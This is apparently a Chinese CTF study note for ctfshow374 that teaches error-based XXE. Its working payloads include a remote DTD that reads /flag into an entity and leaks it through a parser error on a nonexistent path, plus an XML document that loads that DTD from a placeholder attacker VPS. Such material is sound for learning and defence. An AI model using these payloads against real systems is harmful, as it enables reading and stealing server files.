# ctfshow374：报错外带

这篇讲的是另一种经典思路：

> 既然正常回显没有了，那就故意把数据塞进“错误信息”里。

先说前提，这很重要：

- 这条路线只有在“错误信息对你可见”时才特别好用
- 可见的形式可以是：
  - 页面直接显示 XML 解析错误
  - 调试接口返回详细错误
  - 你能看到服务器日志

如果错误完全被吞掉了，这条方法就不一定能直接落地。

---

## 1. 先建立一个直觉

假设解析器要访问这个路径：

```text
file:///nonexistent/hello
```

因为这个路径不存在，解析器可能报错：

```text
failed to load external entity "file:///nonexistent/hello"
```

注意这里的重点：

- 报错信息里会把“它尝试访问的路径”打印出来

那如果我们把这个路径改成：

```text
file:///nonexistent/FLAG{xxxx}
```

报错消息里就可能直接出现 `FLAG{xxxx}`。

这就是“报错外带”的核心直觉。

---

## 2. 为什么它能泄露文件内容

因为 XML 解析器会先做两件事：

1. 读取你定义的外部实体
2. 把实体内容拼接进另一个位置

如果你让它这样做：

- 先把 `/flag` 读到一个实体里
- 再把这个实体内容拼到一个不存在的文件路径中

那么最后的错误路径里就可能包含 flag 内容。

---

## 3. 经典示例

可以在远程 DTD 里这样写：

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'file:///nonexistent/%file;'>">
%oob;
```

再在主 XML 里引用它：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://你的VPS:端口/error.dtd">
  %dtd;
]>
<foo>&exfil;</foo>
```

---

## 4. 逐行翻译

### 第一步：读文件

```dtd
<!ENTITY % file SYSTEM "file:///flag">
```

这里定义 `%file`，它的内容来自 `/flag`。

如果 `/flag` 里是：

```text
ctfshow{abc123}
```

那么 `%file` 展开后就相当于：

```text
ctfshow{abc123}
```

---

### 第二步：故意构造一个不存在的路径

```dtd
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'file:///nonexistent/%file;'>">
```

这表示：

- 再创建一个实体 `exfil`
- 它要访问的路径是：

```text
file:///nonexistent/ctfshow{abc123}
```

这个路径显然不存在，于是解析器报错。

而很多解析器会在报错里原样带出这个路径。

---

### 第三步：触发它

```xml
<foo>&exfil;</foo>
```

只要实体被真正引用，解析器就会尝试访问那个不存在的路径，进而产生错误。

---

## 5. 它和 HTTP 外带的区别

和 [[ctfshow374OOB_HTTP外带]] 相比，这条路线的区别是：

- HTTP 外带：把数据发送到你的服务器
- 报错外带：把数据塞进错误信息里，让你从报错里读

所以它们的共同点是：

- 都不依赖正常业务回显

区别在于：

- 一个依赖“目标能访问你”
- 一个依赖“你能看到错误”

---

## 6. 这条路在 ctfshow374 里要注意什么

题目代码里有：

```php
error_reporting(0);
```

这说明 PHP 层面的错误提示被关掉了。

因此这条方法在 `ctfshow374` 里更适合当作：

- Blind XXE 的思维补充
- 练习“如何把文件内容嵌进解析器行为”
- 理解为什么有人会提到“error-based XXE”

也就是说：

> 它是这题相关的知识点，但是否能直接打通，要看题目环境是不是把 XML 错误真正暴露给你。

---

## 7. 为什么有时还要配合远程 DTD

你可能会问：

“直接在 XML 里写不行吗？为什么又要远程 DTD？”

常见原因有两个：

### 原因 1：写起来更灵活

远程 DTD 里更容易做复杂的实体拼接。

### 原因 2：内部子集限制

XML 的内部 DTD 子集有一些限制，某些参数实体的嵌套写法在里面不好使。

把复杂逻辑放到外部 DTD，经常更稳定。

---

## 8. 常见失败原因

### 1. 错误信息根本不显示

这是最常见的失败原因。

如果页面没有返回错误、日志也看不到，那这条路就没观察点。

---

### 2. 文件内容里有特殊字符

如果 flag 里有空格、换行、引号等，拼到路径里后可能让报错格式变乱，甚至提前截断。

所以实战里常常需要进一步处理编码问题。

---

### 3. 根本没触发实体

只声明不引用，有时候不会真正去访问那个不存在的路径。

---

## 9. 一句话记忆

报错外带的本质可以记成：

> 不求正常显示内容，只求让解析器“在报错时把内容念出来”。

如果你已经看懂这篇，再去看 [[ctfshow374本地DTD_Gadget]]，会更容易理解“为什么大家总想借 DTD 做更复杂的拼装”。
